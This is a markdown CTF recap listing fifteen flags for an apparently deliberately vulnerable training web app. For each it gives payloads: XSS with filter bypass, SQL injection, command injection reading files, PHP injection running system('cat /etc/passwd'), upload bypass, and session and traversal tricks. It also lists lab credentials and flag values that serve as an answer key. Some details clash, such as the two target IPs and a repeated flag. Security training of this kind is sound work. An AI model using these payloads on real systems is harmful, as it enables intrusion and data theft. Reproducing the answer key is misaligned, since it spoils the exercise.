```markdown
# Important Notes and Steps for CTF Challenges

This document provides a recap of the findings, vulnerabilities, and methods used to capture flags during the CTF challenges. Use this as a quick reference for future engagements.

---

## Flags and Exploitation Methods

### Flag 1: `f76sdfkg6sjf`
- **Location**: Welcome.php
- **Vulnerability**: XSS Reflected
- **Method/Payload to Exploit**:
  ```html
  <script>alert("hi")</script>
  ```

---

### Flag 2: `ksdnd99dkas`
- **Location**: Memory-Planner.php (first field)
- **Vulnerability**: XSS Reflected (Advanced)
- **Method/Payload to Exploit**:
  ```html
  <SCRIPscriptT>alert("hi")</SCRIPscripTt>
  ```
  - The input validation removes the word "script," so the word "script" needs to be split up in the payload.

---

### Flag 3: `sd7fk1nctx`
- **Location**: comments.php
- **Vulnerability**: XSS Stored
- **Method/Payload to Exploit**:
  ```html
  <script>alert("hi")</script>
  ```

---

### Flag 4: `nckd97dk6sh2`
- **Location**: About-Rekall.php
- **Vulnerability**: Sensitive Data Exposure
- **Method/Payload to Exploit**:
  - Use Burp Suite or cURL to view the HTTP response headers:
    ```bash
    curl -v http://192.168.14.35/About-Rekall.php
    ```

---

### Flag 5: `mmssdi73g`
- **Location**: Memory-Planner.php (second field)
- **Vulnerability**: Local File Inclusion
- **Method/Payload to Exploit**:
  - Upload any PHP file, such as:
    ```php
    <?php
      echo "Hi!";
    ?>
    ```

---

### Flag 6: `ld8skd62hdd`
- **Location**: Memory-Planner.php (third field)
- **Vulnerability**: Local File Inclusion (Advanced)
- **Method/Payload to Exploit**:
  - Bypass input validation by naming the file `test.jpg.php`.

---

### Flag 7: `bcs92sjsk233`
- **Location**: Login.php (first field)
- **Vulnerability**: SQL Injection
- **Method/Payload to Exploit**:
  - Use the following payload in the login field:
    ```sql
    ' or 1=1 -- -
    ```

---

### Flag 8: `87fsdkf6djf`
- **Location**: Login.php (second field)
- **Vulnerability**: Sensitive Data Exposure
- **Method/Payload to Exploit**:
  - Highlight the web page to find the username and password in the HTML:
    - **Username**: dougquaid
    - **Password**: kuato

---

### Flag 9: `dkkdudfkdy23`
- **Location**: robots.txt
- **Vulnerability**: Sensitive Data Exposure
- **Method/Payload to Exploit**:
  - Access the robots.txt file:
    ```plaintext
    http://192.168.14.35/robots.txt
    ```

---

### Flag 10: `ksdnd99dkas`
- **Location**: networking.php (first field)
- **Vulnerability**: Command Injection
- **Method/Payload to Exploit**:
  - Use the following payload:
    ```bash
    www.welcometorecall.com && cat vendors.txt
    ```

---

### Flag 11: `opshdkasy78s`
- **Location**: networking.php (second field)
- **Vulnerability**: Command Injection (Advanced)
- **Method/Payload to Exploit**:
  - Input validation strips `&` and `;`, so use:
    ```bash
    www.welcometorecall.com | cat vendors.txt
    ```

---

### Flag 12: `hsk23oncsd`
- **Location**: Login.php (second field)
- **Vulnerability**: Brute Force Attack
- **Method/Payload to Exploit**:
  - Use the passwd file to find the user `melina`. The password is the same as the username:
    - **Username**: melina
    - **Password**: melina

---

### Flag 13: `jdka7sk23dd`
- **Location**: souvenirs.php
- **Vulnerability**: PHP Injection
- **Method/Payload to Exploit**:
  - Change the URL to:
    ```plaintext
    http://192.168.13.35/souvenirs.php?message=""; system('cat /etc/passwd')
    ```

---

### Flag 14: `dks93jdlsd7dj`
- **Location**: admin_legal_data.php
- **Vulnerability**: Session Management
- **Method/Payload to Exploit**:
  - Use Burp Suite to test session IDs. The correct session ID is `87`:
    ```plaintext
    http://192.168.13.35/admin_legal_data.php?admin=87
    ```

---

### Flag 15: `dksdf7sjd5sg`
- **Location**: Disclaimer.php
- **Vulnerability**: Directory Traversal
- **Method/Payload to Exploit**:
  - Use the following URL to access the old disclaimer:
    ```plaintext
    http://192.168.13.35/disclaimer.php?page=old_disclaimers/disclaimer_1.txt
    ```

---

## Summary of Tools and Techniques
- **Burp Suite**: Used for intercepting and modifying HTTP requests.
- **cURL**: Used for sending HTTP requests and viewing responses.
- **SQL Injection**: Exploited login forms to bypass authentication.
- **Command Injection**: Used to execute system commands on the server.
- **XSS**: Exploited input fields to execute malicious scripts.
- **Local File Inclusion**: Uploaded malicious files to gain access.
- **PHP Injection**: Injected PHP code via URL parameters.
- **Session Management**: Tested session IDs to access restricted pages.

---

By referencing this guide, you can quickly recall the vulnerabilities, methods, and tools used to capture flags during the CTF challenges. Use this knowledge responsibly and ethically in future engagements.
```